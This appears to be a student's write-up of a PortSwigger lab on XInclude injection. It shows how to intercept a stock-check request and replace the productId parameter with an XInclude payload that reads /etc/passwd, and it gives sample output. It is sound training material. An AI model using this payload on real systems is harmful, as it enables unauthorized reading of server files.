# 📦 Lab: Exploiting XInclude to Retrieve Files
## 📝 **High-Level Summary:**

### 🎯 **Objective:**

Retrieve the contents of `/etc/passwd` using an `XInclude` attack.

### 🔑 **Key Techniques/Concepts:**

- **XInclude Injection:** Embedding an `XInclude` element to access sensitive files.
    
- **XML Parsing:** Bypassing traditional XXE constraints by leveraging `XInclude`.
    

### 🧠 **Key Learning:**

- Understanding how `XInclude` works as an alternative to XXE.
    
- Importance of identifying different XML processing techniques in server-side parsing.
    

---
## 🎯 **Lab URL (if applicable):**

PortSwigger Lab Link

## 📖 **PortSwigger Lab Description:**

This lab has a "Check stock" feature that embeds user input into a server-side XML document that is parsed. Since the entire XML document cannot be controlled, a traditional XXE attack is not possible. The goal is to inject an `XInclude` statement to retrieve the contents of `/etc/passwd`.

## ✅ **PortSwigger Solution:**

1. **Generate Traffic:**
    
    - Visit a product page on the web application.
        
    - Click "Check stock" and intercept the request using Burp Suite.
        
2. **Identify the Vulnerable Parameter:**
    
    - Locate the `POST` request to `/product/stock/`.
        
    - Identify the `productId` parameter in the request body:
        
    
    ```
    productId=2&storeId=1
    ```
    
3. **Craft the Payload:**
    
    - Replace the `productId` parameter with the following XInclude payload:
        
    
    ```
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
    ```
    
4. **Send the Payload:**
    
    - Submit the modified request using Burp Suite's Repeater.
        
    - If successful, the contents of `/etc/passwd` will be returned in the response.
        

---

## 🎓 **Instructor Solution:**

1. **Source Reference:**
    
    - Instructor referred to the [PayloadAllTheThings XInclude Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xinclude-attacks) repository.
        
2. **Generate Traffic:**
    
    - Click "View details" on a product, then "View stock" to generate traffic.
        
3. **Identify Vulnerable Parameter:**
    
    - The vulnerable request was located in Burp Suite with the `POST` request to `/product/stock/`:
        
    
    ```
    productId=2&storeId=1
    ```
    
4. **Craft and Send Payload:**
    
    - The instructor replaced the `productId` with:
        
    
    ```
    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>&storeId=1
    ```
    
    - Sent the payload, revealing the `/etc/passwd` file contents.
        

---
## 📦 **Step-by-Step Solution:**

### 🔥 **Traffic Generation/Initial Steps:**

- Visit a product page and click **"View Stock"**.
    
- Intercept the `POST` request using Burp Suite.
    

```
POST /product/stock/
Host: target.com
Content-Type: application/x-www-form-urlencoded

productId=2&storeId=1
```

---

### 🧩 **Payload Construction/Execution:**

```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>&storeId=1
```

- The payload attempts to retrieve the `/etc/passwd` file by injecting the `XInclude` directive.
    

---

### 📊 **Result:**

- The server responded with the contents of the `/etc/passwd` file, confirming successful exploitation.
    

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
```

---

### ✅ **Completion:**

- The lab is completed once `/etc/passwd` is revealed.
    

---

## 📚 **Why This Solution Works:**

- `XInclude` allows external file inclusion even when a traditional XXE attack is restricted.
    
- By setting `parse="text"`, the server treats the file content as plain text instead of XML.

---

### 📦 **XInclude Attack Summary**

**What is XInclude?**  
XInclude (XML Inclusions) allows you to pull external resources (like files) into an XML document using the `<xi:include>` tag.

---

**Key Components:**

1. **Namespace Declaration (Required)**
    
    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    ```
    
    - This **activates** the XInclude feature in XML.
    - The URL `"http://www.w3.org/2001/XInclude"` is **not a link** but a **label** for the XML parser to recognize XInclude functionality.
2. **File Inclusion Payload:**
    
    ```xml
    <xi:include parse="text" href="file:///etc/passwd"/>
    ```
    
    - **`href`** specifies the file to retrieve (`/etc/passwd` in this case).
    - **`parse="text"`** ensures the file content is returned as plain text.

---

**How the Attack Works:**

1. The namespace (`xmlns:xi`) **enables** the use of `<xi:include>`.
2. The payload with `href="file:///etc/passwd"` tries to load a local file.
3. If successful, the server returns the file content in the response.

---

✅ **Key Insight:**

- The **namespace activates the feature**, while the **`href`** specifies the target file.
- Without the namespace, the XML parser won't understand the `<xi:include>` tag.

---

## 📖 **Key Concepts & Definitions:**

- **XInclude:** A feature of XML allowing inclusion of external resources.
    
- **XXE:** XML External Entity injection, a server-side injection vulnerability.
    

---

## 🛠️ **Tools Used:**

- **Burp Suite:** Used to intercept and modify web requests.
    
- **PayloadAllTheThings:** Reference repository for payload examples.
    

---

## 🏷️ **Hashtags/Tags:**

#CyberSecurity #PenTesting #BurpSuite #XInclude #XXE
